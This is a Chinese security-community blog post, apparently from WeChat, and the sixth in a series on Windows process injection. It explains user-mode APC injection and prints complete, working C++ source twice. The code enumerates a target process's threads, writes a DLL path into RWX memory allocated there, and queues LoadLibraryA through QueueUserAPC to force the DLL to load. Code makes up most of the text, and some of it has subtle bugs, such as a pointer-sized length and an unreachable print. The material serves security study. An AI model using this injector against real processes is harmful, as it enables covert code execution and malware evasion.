> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iMVvcI7lMpN6h1enBzUq2A)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：Gality  
本文字数：7928 字

阅读时长：20 分钟

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](http://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDjy8pCtpvJKBibCLXQDm14MbdlTqXYESXADHkVpL6f81Z4TVFOGQMjBjgxPpUcYnzahRhibQUdcKzQ/0?wx_fmt=png)WgpSec 狼组安全团队推荐搜索进程注入安全工具安全研究漏洞复现

本篇文章为进程注入系列的第六篇文章，同样是在 process-inject 项目的基础上进行进一步的扩展延伸，进而掌握进程注入的各种方式，本系列预计至少会有 10 篇文章，涉及 7 种进程注入方式及一些发散扩展，原项目地址：https://github.com/suvllian/process-inject

  

**_前置知识_**

  

一、

**_APC  
_**

相对来说对网上对 APC 的相关原理性的解释还比较少，APC 也跟内核联系的比较紧密，想深入研究 APC 机制的师傅们可以参考这篇文章 (http://showlinkroom.me/2019/02/10/APC-Injection/)，而如果只是想掌握 APC 注入这种进程注入手法的话，对 APC 机制有个大致的了解即可，我这里尽量用最简单的话解释下 APC, 根据 MSDN 对 APC 的解释 (https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls):

APC(Asynchronous Procedure Calls，异步过程调用)，表示在**指定线程**上下文中异步调用一个函数 (**APC 其实是通过向线程中插入回调函数来实现的，当线程调用上述 API 时，会触发 APC 的回调函数，执行回调函数的代码**)。  
当一个 APC **插入到线程的调用队列**中时，系统将会发出一个**软件中断**。之后每当**线程被挂起**，它就会调用这个 APC 函数。  
由内核产生的 APC 称为内核态（kernel-mode）APC，而由用户应用调用的 APC 称为用户态（user-mode）APC。

我们考虑如下情景：我从网站上下载了一个大文件 (涉及 IO 操作和网络请求)，我们知道，相比于 CPU 计算来说，IO 的速度和网络请求都慢了一大截，但我需要在全部下载完毕后做一个病毒的扫描检测，一个比较自然的想法是什么呢

我创建一个子线程来做这种耗时长的事，趁着这时间，先去处理别的东西，当下载完成后，再去执行扫描任务对吧，APC 就满足了这种需求，每个线程都维护着一个自己的 APC 队列，我们先将一个 APC 插入到指定线程的调用队列中，待该线程进入到 alertable 状态后，就会依次调用 APC 队列中的 APC 请求

当线程调用如下 API 时 (用户态下)，会进入 alertable 的状态：SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx 或 WaitForSingleObjectEx，

但如果 APC 在执行之前等待时间就过了，那么 APC 还是不会被执行，但是 APC 仍然会在队列中继续等待下次线程进入 alertable 状态时执行

例如 ReadFileEx, SetWaitableTimer, SetWaitableTimerEx 和 WriteFileEx，这些 API 就是用 APC 作为完成通知回调机制来实现的

二、

**_APC 注入_**

上面说到了，每一个进程的**每一个线程都有自己的 APC 队列**，我们可以使用 **QueueUserAPC** 函数把一个 APC 函数压入 APC 队列中。当处于用户模式的 APC 被压入到线程 APC 队列后，线程并不会立刻执行压入的 APC 函数，而是要等到线程处于**可通知状态** (alertable) 才会执行，即只有当一个线程内部调用 **SleepEx** 等上面说到的几个特定函数将自己处于**挂起状态**时，才会执行 APC 队列函数，执行顺序与普通队列相同，**先进先出（FIFO）**，在整个执行过程中，线程并无任何异常举动，不容易被察觉，但**缺点**是对于**单线程程序一般不存在挂起状态**，所以 APC 注入对于这类程序没有明显效果。

所以，我们 APC 注入的思路就出来了：

1.  当指定程序执行到某一个上面的等待函数的时候, 系统会产生一个中断
    
2.  当线程唤醒的时候, 这个线程会优先去 APC 队列中调用回调函数
    
3.  利用 QueueUserApc, 往这个队列中插入一个回调
    
4.  插入回调的时候, 把插入的回调地址改为 LoadLibrary, 插入的参数我们使用 VirtualAllocEx 申请内存, 并且写入进去要加载的 Dll 的地址
    

我们今天先讲用户层的 APC 注入，也就是 Ring3 层

**_分析  
_**

  

一、

**_遍历线程 ID_**

既然我们说了，每个线程维护了自己的 APC 队列，所以说 APC 注入也是针对于线程的，那么肯定需要遍历线程 id，在第 4 篇文章中详细讲过了，在 APC 注入中, 由于线程挂起的时机并不确定, 甚至可能某线程永远不会调用 APC 队列, 为了保证我们的 DLL 能在可接受的时间内成功注入, 这里我们采用向某个进程的所有线程 ID 全部注入 APC 请求的方式, 来尽可能的保证 Dll 注入的效果, 代码也是在原来的基础上做了一定修改.

```
//列出指定进程的所有线程
BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) {
    DWORD dwThreadIdListLength = 0;
    DWORD dwThreadIdListMaxCount = 2000;
    LPDWORD pThreadIdList = NULL;
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pThreadIdList == NULL) {
        return FALSE;
    }
    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
    THREADENTRY32 th32 = { 0 };
    //对指定进程拍摄快照
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return(FALSE);
    //使用前先填写结构的大小
    th32.dwSize = sizeof(THREADENTRY32);
    //遍历所有THREADENTRY32结构, 按顺序填入数组
    BOOL bRet = Thread32First(hThreadSnap, &th32);
    while (bRet) {
        if (th32.th32OwnerProcessID == th32ProcessID) {
            if (dwThreadIdListLength >= dwThreadIdListMaxCount) {
                break;
            }
            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
        }
        bRet = Thread32Next(hThreadSnap, &th32);
    }
    *pThreadIdListLength = dwThreadIdListLength;
    *ppThreadIdList = pThreadIdList;
    return TRUE;
}
```

二、

**_申请并写入 DLL 地址_**

老生常谈了。直接上代码：

```
//申请内存
    WCHAR* lpAddr = NULL;
    SIZE_T page_size = 4096;
    lpAddr = (WCHAR*)VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAddr) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    //把Dll的路径复制到内存中
    if (!WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr)) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
```

```
DWORD QueueUserAPC(
  PAPCFUNC  pfnAPC, //指向一个用户提供的APC函数的指针,当线程处于alertable状态时回调
  HANDLE    hThread, //线程句柄，必须有THREAD_SET_CONTEXT 权限
  ULONG_PTR dwData //传递给回调函数的参数值
);
```

三、

**_加入 APC 队列_**

加入 APC 队列的话，主要用的是 QueueUserAPC 这种函数，函数原型为：

```
//获得LoadLibraryA的地址
    auto loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"); 
//遍历APC
    float fail = 0;
    for (int i = dwThreadIdListLength - 1; i >= 0; i--) {
        HANDLE hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
        if (hThread) {
            if (!QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) {
                fail++;
            }
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    printf("Total Thread: %d\n", dwThreadIdListLength);
    printf("Total Failed: %f\n", fail);
    if (fail == 0 || dwThreadIdListLength / fail > 0.5) {
        return TRUE;
        printf("Success to Inject APC");
    }
    else {
        printf("Inject may be failed");
        return FALSE;
    }
```

```
// APCInjectRing3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;
//列出指定进程的所有线程
BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) {
    DWORD dwThreadIdListLength = 0;
    DWORD dwThreadIdListMaxCount = 2000;
    LPDWORD pThreadIdList = NULL;
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pThreadIdList == NULL) {
        return FALSE;
    }
    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
    THREADENTRY32 th32 = { 0 };
    //对指定进程拍摄快照
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return(FALSE);
    //使用前先填写结构的大小
    th32.dwSize = sizeof(THREADENTRY32);
    //遍历所有THREADENTRY32结构, 按顺序填入数组
    BOOL bRet = Thread32First(hThreadSnap, &th32);
    while (bRet) {
        if (th32.th32OwnerProcessID == th32ProcessID) {
            if (dwThreadIdListLength >= dwThreadIdListMaxCount) {
                break;
            }
            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
        }
        bRet = Thread32Next(hThreadSnap, &th32);
    }
    *pThreadIdListLength = dwThreadIdListLength;
    *ppThreadIdList = pThreadIdList;
    return TRUE;
}
BOOL DoInjection(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength) {
    //申请内存
    WCHAR* lpAddr = NULL;
    SIZE_T page_size = 4096;
    lpAddr = (WCHAR*)VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAddr) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    //把Dll的路径复制到内存中
    if (!WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr)) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    //获得LoadLibraryA的地址
    auto loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    //遍历APC
    float fail = 0;
    for (int i = dwThreadIdListLength - 1; i >= 0; i--) {
        HANDLE hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
        if (hThread) {
            if (!QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) {
                fail++;
            }
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    printf("Total Thread: %d\n", dwThreadIdListLength);
    printf("Total Failed: %d\n", (int)fail);
    if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5) {
        printf("Success to Inject APC\n");
        return TRUE;
    }
    else {
        printf("Inject may be failed\n");
        return FALSE;
    } 
}
int main()
{
    ULONG32 ulProcessID = 0;
    printf("Input the Process ID:");
    cin >> ulProcessID;
    CHAR wzDllFullPath[MAX_PATH] = { 0 };
    LPDWORD pThreadIdList = NULL;
    DWORD dwThreadIdListLength = 0;
#ifndef _WIN64
    strcpy_s(wzDllFullPath, "D:\\project\\TestDll\\Release\\TestDll.dll");
#else // _WIN64
    strcpy_s(wzDllFullPath, "D:\\project\\TestDll\\x64\\Release\\TestDll.dll");
#endif
    if (!GetProcessThreadList(ulProcessID, &pThreadIdList, &dwThreadIdListLength)) {
        printf("Can not list the threads!\n");
        exit(0);
    }
    //打开句柄资源
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
    if (hProcess == NULL) {
        printf("failed to open Process\n");
        return FALSE;
    }
    //注入
    if (!DoInjection(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength)) {
        printf("Failed to inject DLL\n");
        return FALSE;
    }
    return 0;
}
```

作用呢就是将一个 APC 请求加入线程的 APC 队列，上面也说了，为了确保注入效果，我们按倒序向每个线程的 APC 队列中加入 APC 请求，因为在遍历的时候得到的线程的 ID，一般是按照活跃程度来排序的，所以，倒叙插入不容易导致进程崩溃。注意，这里要把 LoadLibraryA 的地址作为 APC 的回调函数的地址。

```
//获得LoadLibraryA的地址
    auto loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"); 
//遍历APC
    float fail = 0;
    for (int i = dwThreadIdListLength - 1; i >= 0; i--) {
        HANDLE hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
        if (hThread) {
            if (!QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) {
                fail++;
            }
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    printf("Total Thread: %d\n", dwThreadIdListLength);
    printf("Total Failed: %f\n", fail);
    if (fail == 0 || dwThreadIdListLength / fail > 0.5) {
        return TRUE;
        printf("Success to Inject APC");
    }
    else {
        printf("Inject may be failed");
        return FALSE;
    }
```

**_最终代码及效果_**

  

```
// APCInjectRing3.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
using namespace std;
//列出指定进程的所有线程
BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength) {
    DWORD dwThreadIdListLength = 0;
    DWORD dwThreadIdListMaxCount = 2000;
    LPDWORD pThreadIdList = NULL;
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pThreadIdList == NULL) {
        return FALSE;
    }
    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
    THREADENTRY32 th32 = { 0 };
    //对指定进程拍摄快照
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
        return(FALSE);
    //使用前先填写结构的大小
    th32.dwSize = sizeof(THREADENTRY32);
    //遍历所有THREADENTRY32结构, 按顺序填入数组
    BOOL bRet = Thread32First(hThreadSnap, &th32);
    while (bRet) {
        if (th32.th32OwnerProcessID == th32ProcessID) {
            if (dwThreadIdListLength >= dwThreadIdListMaxCount) {
                break;
            }
            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
        }
        bRet = Thread32Next(hThreadSnap, &th32);
    }
    *pThreadIdListLength = dwThreadIdListLength;
    *ppThreadIdList = pThreadIdList;
    return TRUE;
}
BOOL DoInjection(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength) {
    //申请内存
    WCHAR* lpAddr = NULL;
    SIZE_T page_size = 4096;
    lpAddr = (WCHAR*)VirtualAllocEx(hProcess, nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAddr) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    //把Dll的路径复制到内存中
    if (!WriteProcessMemory(hProcess, lpAddr, wzDllFullPath, (strlen(wzDllFullPath) + 1) * sizeof(wzDllFullPath), nullptr)) {
        VirtualFreeEx(hProcess, lpAddr, page_size, MEM_DECOMMIT);
        CloseHandle(hProcess);
        return FALSE;
    }
    //获得LoadLibraryA的地址
    auto loadLibraryAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    //遍历APC
    float fail = 0;
    for (int i = dwThreadIdListLength - 1; i >= 0; i--) {
        HANDLE hThread  = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
        if (hThread) {
            if (!QueueUserAPC((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr)) {
                fail++;
            }
            CloseHandle(hThread);
            hThread = NULL;
        }
    }
    printf("Total Thread: %d\n", dwThreadIdListLength);
    printf("Total Failed: %d\n", (int)fail);
    if ((int)fail == 0 || dwThreadIdListLength / fail > 0.5) {
        printf("Success to Inject APC\n");
        return TRUE;
    }
    else {
        printf("Inject may be failed\n");
        return FALSE;
    } 
}
int main()
{
    ULONG32 ulProcessID = 0;
    printf("Input the Process ID:");
    cin >> ulProcessID;
    CHAR wzDllFullPath[MAX_PATH] = { 0 };
    LPDWORD pThreadIdList = NULL;
    DWORD dwThreadIdListLength = 0;
#ifndef _WIN64
    strcpy_s(wzDllFullPath, "D:\\project\\TestDll\\Release\\TestDll.dll");
#else // _WIN64
    strcpy_s(wzDllFullPath, "D:\\project\\TestDll\\x64\\Release\\TestDll.dll");
#endif
    if (!GetProcessThreadList(ulProcessID, &pThreadIdList, &dwThreadIdListLength)) {
        printf("Can not list the threads!\n");
        exit(0);
    }
    //打开句柄资源
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);
    if (hProcess == NULL) {
        printf("failed to open Process\n");
        return FALSE;
    }
    //注入
    if (!DoInjection(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength)) {
        printf("Failed to inject DLL\n");
        return FALSE;
    }
    return 0;
}
```

x86 版本

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzD5eIB9jSdOzqyrPScwric639xA7bDjMGibYSeICZBXHiadDqKU3yxdyEmeJB7iaxrTibezkJgZmzWotow/640?wx_fmt=png)

x64 版本

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzD5eIB9jSdOzqyrPScwric63dKPYcTyf4bQ8L2FhA6w3ibEjL2CQ37IYVT06yx7j9y3feHOvMDUxvww/640?wx_fmt=png)

  

**_后记_**

  

当然，完全可以指定线程 id 来只注入特定线程，只不过测试后发现随机性真的太大了，而且需要等待多长时间才能完成注入几乎是随机的，甚至可能一直注入不了，所以在 APC 注入中 (用户态下)， 最好是向每个线程中都注入

用户态的 APC 注入就是这个样子了，下一章我们说说内核态的 APC 注入实现方式

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzCicmtP2h2SM3ukEYyySF7KlJ5UaqzBkhoBBmxgaEYfUJHOOMaB2apAlFs7knDXHUBQBtROibYibzNPQ/640?wx_fmt=jpeg)

Gality

过去的很久没更新了, 未来会补上

公众号

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)